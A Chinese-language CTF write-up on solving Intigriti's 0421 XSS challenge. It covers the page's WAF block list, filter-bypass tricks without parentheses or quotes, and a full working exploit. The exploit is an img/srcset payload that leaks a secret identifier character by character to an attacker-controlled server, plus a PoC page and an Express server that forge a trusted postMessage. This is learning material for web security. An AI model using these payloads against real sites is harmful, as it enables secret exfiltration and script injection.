---
title: 解題心得：Intigriti's 0421 XSS challenge（上）
catalog: true
date: 2021-05-25 22:13:21
tags: [Security, Front-end]
categories:
  - Security
---

## 前言

有天我在網路上閒晃的時候，看到了一個 XSS challenge：[Intigriti's 0421 XSS challenge - by @terjanq](https://challenge-0421.intigriti.io/)，除了這個挑戰本身很吸引我之外，更吸引我的是出題的作者。

之前在網路上找到的許多比較偏前端的資安相關資源，都是由這個作者在維護或是貢獻的，例如說 [Tiny XSS Payloads](https://tinyxss.terjanq.me/) 或者是令人大開眼界的 [XS-Leaks Wiki](https://xsleaks.dev/)。

[Intigriti](https://www.intigriti.com/) 這個網站似乎每個月都會舉辦這種 XSS challenge，而這一次的是他們有史以來舉辦過最難的一個。挑戰時間從 4/19~4/25，有一週的時間可以嘗試，最後成功解出的有 15 人。三月份的挑戰有 45 人解開，二月份有 33 人，所以這一次解出的人數確實少了許多，可想而知題目的難度。

我大概花了五天的時間，每天卡關的時候都想說「放棄好了，坐等解答」，但卻又時不時會有一些新的想法出現，想說就繼續試一下，最後終於在截止的那一天於時限前解開，解開的時候雙手握拳然後手肘往後，大喊：「太神辣」。

這篇想來記錄一下解題的心得，之前有寫了英文版的但大概比小學生作文還不如，還是寫個中文版的比較能完整表達自己的想法。標題會有個「上」是因為這篇寫我的解法，下一篇想來寫作者的解法，下下篇分析其他人的解法。

但我的部落格似乎被下了還沒寫好的系列文都會斷連載的詛咒，希望這次可以撐過去。

<!-- more -->

## 題目內容

題目在這邊：https://challenge-0421.intigriti.io/

目標是要在這個網站上成功執行 XSS，執行 `alert('flag{THIS_IS_THE_FLAG}')` 才算獲勝。

這道題目一共有兩個網頁，第一個是 index.html，底下我只擷取題目相關的程式碼：

``` html
<iframe id="wafIframe" src="./waf.html" sandbox="allow-scripts" style="display:none"></iframe>
<script>
  const wafIframe = document.getElementById('wafIframe').contentWindow;
  const identifier = getIdentifier();

  function getIdentifier() {
      const buf = new Uint32Array(2);
      crypto.getRandomValues(buf);
      return buf[0].toString(36) + buf[1].toString(36)
  }

  function htmlError(str, safe){
      const div = document.getElementById("error-content");
      const container = document.getElementById("error-container");
      container.style.display = "block";
      if(safe) div.innerHTML = str;
      else div.innerText = str;
      window.setTimeout(function(){
        div.innerHTML = "";
        container.style.display = "none";
      }, 10000);
  }

  function addError(str){
      wafIframe.postMessage({
          identifier,
          str
      }, '*');
  }

  window.addEventListener('message', e => {
      if(e.data.type === 'waf'){
          if(identifier !== e.data.identifier) throw /nice try/
          htmlError(e.data.str, e.data.safe)
      }
  });

  window.onload = () => {
      const error = (new URL(location)).searchParams.get('error');
      if(error !== null) addError(error);
  }

</script>
```

首先在 window onload 的時候會從 URL 的 query string 上面拿 `error` 的內容出來，然後呼叫 `addError(error)`。接著會把內容加上一個隨機產生的 id 用 postMessage 送到 `wafIframe`。

`wafIframe` 處理完畢之後會再用 postMessage 把結果送回來，先檢查 identifier 是否相同，相同的話驗證通過，再看 e.data.safe 是不是 true，是的話就用 innerHTML 新增 e.data.str，否則的話就用 innerText。

再來我們看看另一個頁面 waf.html 在幹嘛：

``` js
onmessage = e => {
    const identifier = e.data.identifier;
    e.source.postMessage({
        type:'waf',
        identifier,
        str: e.data.str,
        safe: (new WAF()).isSafe(e.data.str)
    },'*');
}

function WAF() {
    const forbidden_words = ['<style', '<iframe', '<embed', '<form', '<input', '<button', '<svg', '<script', '<math', '<base', '<link', 'javascript:', 'data:'];
    const dangerous_operators = ['"', "'", '`', '(', ')', '{', '}', '[', ']', '=']

    function decodeHTMLEntities(str) {
        var ta = document.createElement('textarea');
        ta.innerHTML = str;
        return ta.value;
    }

    function onlyASCII(str){
        return str.replace(/[^\x21-\x7e]/g,'');
    }

    function firstTag(str){
        return str.search(/<[a-z]+/i)
    }

    function firstOnHandler(str){
        return str.search(/on[a-z]{3,}/i)
    }

    function firstEqual(str){
        return str.search(/=/);
    }

    function hasDangerousOperators(str){
        return dangerous_operators.some(op=>str.includes(op));
    }

    function hasForbiddenWord(str){
        return forbidden_words.some(word=>str.search(new RegExp(word, 'gi'))!==-1);
    }

    this.isSafe = function(str) {
        let decoded = onlyASCII(decodeHTMLEntities(str));

        const first_tag = firstTag(decoded);
        if(first_tag === -1) return true;
        decoded = decoded.slice(first_tag);

        if(hasForbiddenWord(decoded)) return false;

        const first_on_handler = firstOnHandler(decoded);
        if(first_on_handler === -1) return true;
        decoded = decoded.slice(first_on_handler)

        const first_equal = firstEqual(decoded);
        if(first_equal === -1) return true;
        decoded = decoded.slice(first_equal+1);

        if(hasDangerousOperators(decoded)) return false;
        return true;
    }
}
```

這邊收到 index 傳來的資料時會經過一系列驗證，看看送來的資料是不是 safe，做的檢查依序為：

1. 先把送來的資料 decode 而且只允許 ASCII
2. 找第一個 html tag 並且過濾掉 `['<style', '<iframe', '<embed', '<form', '<input', '<button', '<svg', '<script', '<math', '<base', '<link', 'javascript:', 'data:']`
3. 找 onXXX handler 之後出現的第一個 = 號
4. 不能有以下字元 `['"', "'", '``', '(', ')', '{', '}', '[', ']', '=']`
5. 以上都成功的話才 safe，才會被 index.html 當作 innerHTML 來解釋

結合以上條件，如果我傳 error=123，畫面就會顯示 123。如果我傳 `<h1>hello</h1>`，畫面就真的會顯示一個 hello 的 heading，但如果我傳 `<script>alert(1)</script>`，畫面就只會用文字顯示出來而不是當作 HTML 來執行，因為 safe 是 false。

以上大概就是題目的基本介紹，在這邊非常推薦大家自己先玩玩看，至少嘗試個一兩個小時卡關卡到爆之後再來看心得，收穫會多很多。

底下就是解題的心路歷程，會直接按照我解題的時間軸來寫。

## 初次嘗試

從題目中不難看出，想要成功 XSS 的話有兩條路可以走：

1. 用各種奇技淫巧繞過限制，直接在頁面上執行 XSS
2. 自己用 `window.open` 打開這頁面然後 postMessage，偽造訊息並且讓 safe 是 true，這樣就可以插入任意 HTML

一開始我是朝 1 的方向來想，因為 2 的話需要知道 identifier 是什麼，但因為那是隨機的所以不可能，我認為是一條死路。

所以接下來就是要想，要怎麼樣去繞過判斷的限制。

從濾掉的 tag 中可以發現我最愛的 `<img>` 沒有被濾掉，而 onXX 的 event handler 只是限制內容，也沒有一起被濾掉，所以可以用：`<img src=x onerror=123>` 來執行 JS。

但問題來了，儘管可以執行 JS，但不能用的字元太多了，`()` 不能用所以不能呼叫函式，想用反引號 ` 來呼叫也不行，那要怎麼樣執行 alert？我在這邊卡了很久，最後去 google：「js call function without parentheses」，找到了這一篇：[js call function without parentheses](https://stackoverflow.com/questions/35949554/invoking-a-function-without-parentheses/35949617)，裡面提到了很多沒有想過的招數。

例如說物件的 valueOf 搭配 +，或者是用 new 的方式搭配 constructor，或最讓我驚豔的一個是 onerror=eval 搭配 throw，這些都是超級帥的技巧，試著不用 `()` 來繞過限制。

但以上這些通通都沒用，因為限制實在是太嚴格了，物件的 `{}` 不能用，new 因為要有空格所以也不能用。不能有空格是因為 `<img onerror=new abc>` 會被解釋為：`<img onerror="new" abc>`，如果想要一起被放入 onerror 就只能自己用 `"` 框起來，但 `"` 是限制的字元不能使用，所以 onerror 裡面不能出現空格。

throw 看起來有點機會，但是作為執行前提的 `onerror=eval` 有個等號，所以也沒辦法使用。

在這時候我就想說，那如果把限制的字元用 HTML entity encode 呢？把 `=` 變成 `&#61;` 來繞過限制。

試了之後發現沒有用，因為早在第一步 `decodeHTMLEntities(str)` 的時候就被還原成字元了，這時候我有兩個想法：

1. 那可以對 decodeHTMLEntities 裡面的 textarea XSS 嗎？
2. 那可以 double encode 嗎？

第一條路行不通，因為雖然有 `ta.innerHTML = str;`，但這元素從來沒有被放到 DOM 上，所以沒有用。

第二條路也行不通，因為最後 `&#61;` 只會被視作文字來顯示。

嘗試了許久，最後我什麼都試不出來，可以執行成功的程式碼頂多只有：`<img src=x onerror=throw/0/+identifier>`，把 identifier 作為錯誤訊息丟出來，然後就沒了。但這也什麼都做不到。

## 提示的幫助

這個挑戰每獲得 100 個愛心就會放出提示，而因為題目難度太高的關係所以也有加碼提示，我那時看到的有：

1. First hint: find the objective! (4/19 21:57)
2. Time for another hint! Where to smuggle data? (4/20 00:24)
3. Time for another tip! One bite after another! (4/20 19:55)

說實在的，以上這幾個提示我都沒有看很懂，比較了解的是第三個，應該是 One "Byte" after another 的意思，回顧到我最前面所提到的 XS-Leaks 那個東西，我這時想說：「靠，該不會我一開始以為死路的路才是正解吧」。

我說的死路就是前面提到的：「從別的地方自己 postMessage 偽造訊息」，但前提是我要知道隨機產生的 identifier 是什麼才能成功。如果說這條路才是正解，那要解開的話流程就應該是：

1. 開一個自己的網頁，用 window.open 打開 xss challenge
2. 用某種方法得到 identifier
3. 從這個網頁自己 postMessage 過去，插入任意 HTML

只要第二步成功了就可以整個串起來了。但問題是，我要怎麼知道 identifier 是什麼？既然提示說 one byte after another，那我猜應該是一個字元一個字元洩漏出去，所以可以先從一個字元開始想。

此時我想到這個：`<img src=x onerror=identifier<'1'?is_zero:keep_trying>`，我們可以用三元運算子搭配 `<` 來判斷第一個字是什麼，雖然不能用字串，但 `'1'` 可以用 `<div id=n1>1</div>` + `n1.innerText` 來取代，來避開單雙引號。而三元運算子可以一直巢狀下去，像是這樣：

``` js
identifier<'1'?is_zero:
identifier<'2'?is_one:
identifier<'3'?is_two:
identifier<'4'?is_three:
....
```

所以我們確實可以透過這方法得知 identifier 的第一個字元是什麼，但問題來了，知道之後，我們怎樣把這個資訊傳出去？

我們不能呼叫 function，甚至連賦值也不行，怎樣把資訊傳出去？如果可以用 `=` 的話那就可以 `window.opener.location = xxx+1` 之類的去改變 window.opener 的資訊，或者是：`<img id=a src=x>` 搭配 `a.src=xxxx` 去載入一個新的圖片，這樣我從 server side 就可以知道洩漏的字元是什麼。

但因為沒辦法用等號，所以上面這些都做不到。

這時候我又卡關了，而且卡了非常久，完全想不到該怎麼把資訊傳出去，這時候等到了下一個提示：

1. Here's an extra tip: ++ is also an assignment (4/20 22:17)

我一開始看見這提示時覺得好像有點用，卻又不知道該怎麼用。`++` 也可以改變值沒有錯，可是有什麼用呢？我一開始想說朝 window.opener 的方向去想，有沒有一些屬性是可以操控的，例如說：`window.opener.name++`是可行的嗎？或是有什麼其他屬性可以操控的。

如果我能夠改變某個 window.opener 的屬性，就能把洩漏的資訊透過某種方式傳回去。可是我找了很久還去翻了 spec，發現好像沒這種東西。`window.opener.location` 可以改變，但不能用 `++`，因為 `++` 就像是 `window.opener.location = window.opener.location + 1`，執行的話會拋錯，因為有涉及到讀取：

```
VM82:1 Uncaught DOMException: Blocked a frame with origin "https://challenge-0421.intigriti.io" from accessing a cross-origin frame.
```

這時我想起了忘記在哪學到的一個招數，利用圖片的載入。

舉例來說，讓一張圖片不被載入，然後透過 ++ 改變 CSS 或其他屬性讓它載入，這樣我就可以從 server 知道這個資訊。

我試了這個：

``` html
<img id=n0 src=//server/n0 style="opacity:0;">
<img src=x onerror=identifier<'1'?n0.style.opacity++:...>
```

但透明度是 0 還是會載入圖片，所以沒有用。後來再試了幾個屬性，想起了最近有用到的一個：`loading`。

以往如果要 lazy load 圖片的話，比較多是透過套件，早期需要去偵測 scroll，近期則是用 IntersectionObserver 就行了。而再更近一點，現在有不少瀏覽器有支援原生的 lazy loading：`<img src=x loding="lazy">`，如果圖片距離可視區域沒有超過一個 threshold 的話就不會被載入。

因此我們可以這樣做：

``` html
<div style="height: 9999px"></div>
<img id=n0 src=//server/n0 loading="lazy">
<img src=x onerror=identifier<'1'?n0.loading++:...>
```

先用一個很高的 div 把圖片往下推，推到 threshold 之外，然後在確認第一個字元是 0 的時候，把 n0 的 loading++，++ 之後會是 NaN，然後因為 loading 沒有 NaN 這個值，所以會 fallback 到預設的 auto，就會載入圖片。

假設 `server/n0` 是我自己的 server，那我收到 n0 這個 request，就代表第一個字元是 0。把這個想法擴展，我們確實可以知道第一個字元是什麼，像這樣：

``` html
<div style="height: 9999px"></div>
<img id=n0 src=//server/n0 loading="lazy">
<img id=n1 src=//server/n1 loading="lazy">
<img id=n2 src=//server/n2 loading="lazy">
<img src=x onerror=
identifier<'1'?n0.loading++:
identifier<'2'?n1.loading++:
identifier<'3'?n2.loading++:
...>
```

有了第一個字元了！那第二個怎麼辦？

沒辦法用 `identifier[1]`，因為不能用括號。我想說有沒有 `str.1` 這種語法，結果也沒有。

在想過各種可能以後，我覺得這條路是死路，不可能在不能使用 `[](){}` 的情況下，拿到第 n 個字元。

## 解開弱化版？

雖然說我覺得不可能拿到第 n 個字元，解題也就此卡住，但我有了一個大膽的想法。

字串我沒有辦法拿到第 n 個字元，但如果是數字呢？我是不是可以透過一系列數學運算拿到？例如說 123，要拿到 2 就是 123/10%10 之類的（不過出來會是小數）。或者是直接利用二進位，`num&1` 就可以知道 num 的最後一個 bit，`num&2` 就可以知道倒數第二個 bit，以此類推，就可以知道每一個 bit 是多少。

可是 identifier 不是數字，那該怎麼辦？想辦法轉成數字！如果 identifier 只包含 0-9a-z，那我們可以在前面加上 `0x` 並搭配 + 轉成數字，最後會像這樣：

``` js
<body>
  <div style=height:9999px id=a>0x</div>
  <img src=https://example.com/x00 id=x00 loading=lazy>
  <img src=https://example.com/x01 id=x01 loading=lazy>
  <img src=https://example.com/x10 id=x10 loading=lazy>
  <img src=https://example.com/x11 id=x11 loading=lazy>
  <img src=https://example.com/x20 id=x20 loading=lazy>
  <img src=https://example.com/x21 id=x21 loading=lazy>
  <img src=x onerror=
a.innerText+identifier&1?x01.loading++:x00.loading++;
a.innerText+identifier&2?x11.loading++:x10.loading++;
a.innerText+identifier&4?x21.loading++:x20.loading++ >

</body>
<script>
  var identifier = 'a4' // 164
  // 10100100
  
</script>
```

這邊要注意的是 operator 的優先順序，有些如果順序不如預期就無法那樣用，例如說：`+'0x'+identifier` 就會先執行 `+0x`，而不是先把後面的字串相加。這邊剛好 & 會先試著轉成數字，所以才能這樣用。

從上面的 POC 可以證明如果我們能把 identifier 轉成數字，我們就可以解開這題。但 identifier 可能會有 f 以上的字元，那他可以轉成數字的機率是多少呢？

``` js
var count = 0
for(let i=0; i<100000;i++) {
  var id = getIdentifier()
  if (!Number.isNaN(Number('0x' + id))) {
    count++
  }
}
// 7, 0.007
console.log(count, (count * 100) / 100000)
```

不到 0.01%，非常低的機率，平均需要一萬次才能成功。

雖然這個機率無法接受，但至少我知道這個弱化的版本是解得開的。

## 又靠提示

在弱化版解開之後，我想說差不多就到這裡了。會不會是我方向錯誤，其實根本不是這樣解？

因為我真的想不到該怎樣才能拿到 `identifier[n]`，覺得這不可能。

此時我又看到了新的提示：

1. "Behind a Greater Oracle there stands one great Identity" (leak it) (4/22 15:53)
2. Tipping time! Goal < object(ive) (4/23 01:58)

從這兩個新的提示，驗證了我的方向其實是對的，就是要 leak identifier，然後就是要用 `<` 的符號去比較。

所以我應該只差最後一兩步而已，就快要破關了。但這一兩步真的很難。

雖然說已經想要放棄了，但過了一天，又有一個新的想法：「其實根本不需要單獨拿到第二個字元！假設我有個地方 str 存第一個字元，那我只要 `identifier < str + '1'` 不就好了嗎？」

如果有地方存已經找到的字元，那就可以用類似迴圈的概念去跑，就可以洩漏出所有字元了。

那這個地方會是哪裡？這地方需要可以從 opener 傳過來，因為只有 opener 會知道現在洩漏出去的字元是什麼。可是因為 cross origin 的關係，opener 沒有一個屬性是可以存取的。

嘗試了大概一兩個小時，我突然想到可以反過來，不是從 opener 拿東西，而是 opener 把東西傳給 open 的 window。怎麼傳？可以用 location.hash！

從我們的網頁中用 window.open 開啟 XSS challenge 之後，可以用 `win.location = url + '#a'` 來加上 hash 而且不會重新載入網頁。加入之後在網頁中就可以用 `location.hash` 存取到。透過 location.hash 在 cross origin 的 window 之間交換資訊。

雖然說又往前邁進了一步，但其實還有兩個問題需要被解決：

1. 我們需要一個類似迴圈的東西
2. 我們需要能夠多次發送 request 到 server

先從第一個問題開始，我們需要不斷執行類似的程式碼，才能洩漏一個一個字元出來。這個倒是不難，可以透過 `this.src++` 去改變 img 的 src，只要 src 一被賦值，儘管值一樣，還是會重新載入圖片，例如說這樣：

``` html
<body>
  <script>
    var count = 1
  </script>
  <img src=x onerror=count<10?count++&&src++:console.log(count)>
</body>
```

上面的程式碼會不斷把 count++，直到符合條件為止。`count++&&src++` 也可以換成 `count++ + src++`，把空格去掉變成很多加號的 `count+++src++`。

迴圈沒有問題了，接下來是多次洩露資訊的部分。之前我們用的 lazy loading，一個圖片只能用一次，因為圖片一旦載入了就是載入了，沒辦法再用 img.loading++ 來讓它再被載入一次。那怎麼辦呢？我們需要一個管道可以讓我們在指定的時機發送正確的 request。

在隨便亂試試了一段時間之後，我發現了一個神奇的屬性：srcset，神奇的點在於它跟 src 一起用的時候。

當我 src 與 srcset 一起設定的時候，瀏覽器會優先載入 srcset 的 url，而神奇的是當我把 src++ 的時候，就會再載入一次 srcset！下面是範例，會把 `x2` 載入十遍：

``` js
<body>
  <script>
    var count = 1
  </script>
  <img src=x1 srcset=x2 onerror=count<10?count+++this.src++:123>
</body>
```

既然這兩個問題都解開了，那把這些拼湊起來，就可以湊出最後的答案了，流程如下：

1. 打開 poc.html，window.open XSS challenge
2. error 帶上我們準備好的 payload
3. 用 img 的 onerror 執行一堆巢狀的三元運算子，符合條件就載入相對應的圖片，洩漏出第 n 個字，並等待下一圈迴圈開始
4. server 接收到圖片，知道第 n 個字是什麼
5. server 把結果傳給 poc.html，poc.html 去更新 win.location.hash
6. 更新完之後 server 透過回傳 response 來開啟下一圈迴圈，把 n+1，回到第 3 步
7. 重複以上動作直到找出 token

以上是最理想的流程，但因為時間因素所以我有幾個地方沒有照著做，例如說：

1. 我假設 identifier 的第一個字是 `1`，不是的話就跳掉
2. server 等待 500ms 就會開始下一圈迴圈，但有可能 location.hash 還沒更新完成
3. server 傳結果給 poc.html 最理想是用 websocket，但我偷懶用 long polling
4. 我懶的判斷 identifier 是不是全部抓完，所以等 length > 10 就開始嘗試 postMessage

最後的程式碼長這樣：

``` js
var payload = `
<img srcset=//my_server/0 id=n0 alt=#>
<img srcset=//my_server/1 id=n1 alt=a>
<img srcset=//my_server/2 id=n2 alt=b>
<img srcset=//my_server/3 id=n3 alt=c>
<img srcset=//my_server/4 id=n4 alt=d>
<img srcset=//my_server/5 id=n5 alt=e>
<img srcset=//my_server/6 id=n6 alt=f>
<img srcset=//my_server/7 id=n7 alt=g>
<img srcset=//my_server/8 id=n8 alt=h>
<img srcset=//my_server/9 id=n9 alt=i>
<img srcset=//my_server/a id=n10 alt=j>
<img srcset=//my_server/b id=n11 alt=k>
<img srcset=//my_server/c id=n12 alt=l>
<img srcset=//my_server/d id=n13 alt=m>
<img srcset=//my_server/e id=n14 alt=n>
<img srcset=//my_server/f id=n15 alt=o>
<img srcset=//my_server/g id=n16 alt=p>
<img srcset=//my_server/h id=n17 alt=q>
<img srcset=//my_server/i id=n18 alt=r>
<img srcset=//my_server/j id=n19 alt=s>
<img srcset=//my_server/k id=n20 alt=t>
<img srcset=//my_server/l id=n21 alt=u>
<img srcset=//my_server/m id=n22 alt=v>
<img srcset=//my_server/n id=n23 alt=w>
<img srcset=//my_server/o id=n24 alt=x>
<img srcset=//my_server/p id=n25 alt=y>
<img srcset=//my_server/q id=n26 alt=z>
<img srcset=//my_server/r id=n27 alt=0>
<img srcset=//my_server/s id=n28>
<img srcset=//my_server/t id=n29>
<img srcset=//my_server/u id=n30>
<img srcset=//my_server/v id=n31>
<img srcset=//my_server/w id=n32>
<img srcset=//my_server/x id=n33>
<img srcset=//my_server/y id=n34>
<img srcset=//my_server/z id=n35>

<img id=lo srcset=//my_server/loop onerror=
n0.alt+identifier<location.hash+1?n0.src+++lo.src++:
n0.alt+identifier<location.hash+2?n1.src+++lo.src++:
n0.alt+identifier<location.hash+3?n2.src+++lo.src++:
n0.alt+identifier<location.hash+4?n3.src+++lo.src++:
n0.alt+identifier<location.hash+5?n4.src+++lo.src++:
n0.alt+identifier<location.hash+6?n5.src+++lo.src++:
n0.alt+identifier<location.hash+7?n6.src+++lo.src++:
n0.alt+identifier<location.hash+8?n7.src+++lo.src++:
n0.alt+identifier<location.hash+9?n8.src+++lo.src++:
n0.alt+identifier<location.hash+n1.alt?n9.src+++lo.src++:
n0.alt+identifier<location.hash+n2.alt?n10.src+++lo.src++:
n0.alt+identifier<location.hash+n3.alt?n11.src+++lo.src++:
n0.alt+identifier<location.hash+n4.alt?n12.src+++lo.src++:
n0.alt+identifier<location.hash+n5.alt?n13.src+++lo.src++:
n0.alt+identifier<location.hash+n6.alt?n14.src+++lo.src++:
n0.alt+identifier<location.hash+n7.alt?n15.src+++lo.src++:
n0.alt+identifier<location.hash+n8.alt?n16.src+++lo.src++:
n0.alt+identifier<location.hash+n9.alt?n17.src+++lo.src++:
n0.alt+identifier<location.hash+n10.alt?n18.src+++lo.src++:
n0.alt+identifier<location.hash+n11.alt?n19.src+++lo.src++:
n0.alt+identifier<location.hash+n12.alt?n20.src+++lo.src++:
n0.alt+identifier<location.hash+n13.alt?n21.src+++lo.src++:
n0.alt+identifier<location.hash+n14.alt?n22.src+++lo.src++:
n0.alt+identifier<location.hash+n15.alt?n23.src+++lo.src++:
n0.alt+identifier<location.hash+n16.alt?n24.src+++lo.src++:
n0.alt+identifier<location.hash+n17.alt?n25.src+++lo.src++:
n0.alt+identifier<location.hash+n18.alt?n26.src+++lo.src++:
n0.alt+identifier<location.hash+n19.alt?n27.src+++lo.src++:
n0.alt+identifier<location.hash+n20.alt?n28.src+++lo.src++:
n0.alt+identifier<location.hash+n21.alt?n29.src+++lo.src++:
n0.alt+identifier<location.hash+n22.alt?n30.src+++lo.src++:
n0.alt+identifier<location.hash+n23.alt?n31.src+++lo.src++:
n0.alt+identifier<location.hash+n24.alt?n32.src+++lo.src++:
n0.alt+identifier<location.hash+n25.alt?n33.src+++lo.src++:
n0.alt+identifier<location.hash+n26.alt?n34.src+++lo.src++:
n35.src+++lo.src++>`
```

``` html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
  </head>
  <body>  
  </body>
  <script>
    var payload = // see above
    payload = encodeURIComponent(payload)

    var baseUrl = 'https://my_server'

    // reset first
    fetch(baseUrl + '/reset').then(() => {
      start()
    })

    async function start() {
      // assume identifier start with 1
      console.log('POC started')
      if (window.xssWindow) {
        window.xssWindow.close()
      }

      window.xssWindow = window.open(`https://challenge-0421.intigriti.io/?error=${payload}#1`, '_blank')

      polling()
    }

    function polling() {
      fetch(baseUrl + '/polling').then(res => res.text()).then((token) => {

        // guess fail, restart
        if (token === '1zz') {
          fetch(baseUrl + '/reset').then(() => {
            console.log('guess fail, restart')
            start()
          })
          return
        }

        if (token.length >= 10) {
          window.xssWindow.postMessage({
            type: 'waf',
            identifier: token,
            str: '<img src=xxx onerror=alert("flag{THIS_IS_THE_FLAG}")>',
            safe: true
          }, '*')
        }

        window.xssWindow.location = `https://challenge-0421.intigriti.io/?error=${payload}#${token}`

        // After POC finsihed, polling will timeout and got error message, I don't want to print the message
        if (token.length > 20) {
          return
        }

        console.log('token:', token)
        polling()
      })
    }
  </script>
</html>
```

寫得很隨便很醜而且有 bug 的 server side code：

``` js
var express = require('express')

const app = express()

app.use(express.static('public'));
app.use((req, res, next) => {
  res.set('Access-Control-Allow-Origin', '*');
  next()
})

const handlerDelay = 100
const loopDelay = 550

var initialData = {
  count: 0,
  token: '1',
  canStartLoop: false,
  loopStarted: false,
  canSendBack: false
}
var data = {...initialData}

app.get('/reset', (req, res) => {
  data = {...initialData}
  console.log('======reset=====')
  res.end('reset ok')
})

app.get('/polling', (req, res) => {
  function handle(req, res) {
    if (data.canSendBack) {
      data.canSendBack = false
      res.status(200)
      res.end(data.token)
      console.log('send back token:', data.token)

      if (data.token.length < 14) {
        setTimeout(() => {
          data.canStartLoop = true
        }, loopDelay)
      }
    } else {
      setTimeout(() => {
        handle(req, res)
      }, handlerDelay)
    }
  }

  handle(req, res)
})

app.get('/loop', (req, res) => {
  function handle(req, res) {
    if (data.canStartLoop) {
      data.canStartLoop = false
      res.status(500)
      res.end()
    } else {
      setTimeout(() => {
        handle(req, res)
      }, handlerDelay)
    }
  }

  handle(req, res)
})

app.get('/:char', (req, res) => {
  // already start stealing identifier
  if (req.params.char.length > 1) {
    res.end()
    return
  }
  console.log('char received', req.params.char)
  if (data.loopStarted) {
    data.token += req.params.char
    console.log('token:', data.token)
    data.canSendBack = true

    res.status(500)
    res.end()
    return 
  }

  // first round
  data.count++
  if (data.count === 36) {
    console.log('initial image loaded, start loop')
    data.count = 0
    data.loopStarted = true
    data.canStartLoop = true
  }
  res.status(500)
  res.end()
})

app.listen(5555, () => {
  console.log('5555')
})
```

## 結語

從這個 XSS challenge 裡面學到滿多的東西的，例如說：

1. 利用 img src + onerror 製造迴圈（其實精確地講應該是遞迴啦）
2. 利用 img src + srcset 來重複載入圖片
3. 利用 location.hash 交換資訊
4. 換個方式思考問題，用 > < 取代 ==，用比較代替等號
5. 利用 /a/.source 或是 img.alt 之類的東西來取代字串，不使用單雙反引號構造字串

雖然花了不少時間，但解出來的那一刻成就感滿大的，而且又是難題所以成就感更高了。

這篇主要是描述我自己的解法，雖然有點麻煩（因為需要 server side），但是是我唯一可以想出來的解法。

如果沒意外的話，下一篇會跟大家介紹官方解答，利用一個我不會用而且完全忽略掉的元素：`<object>`。

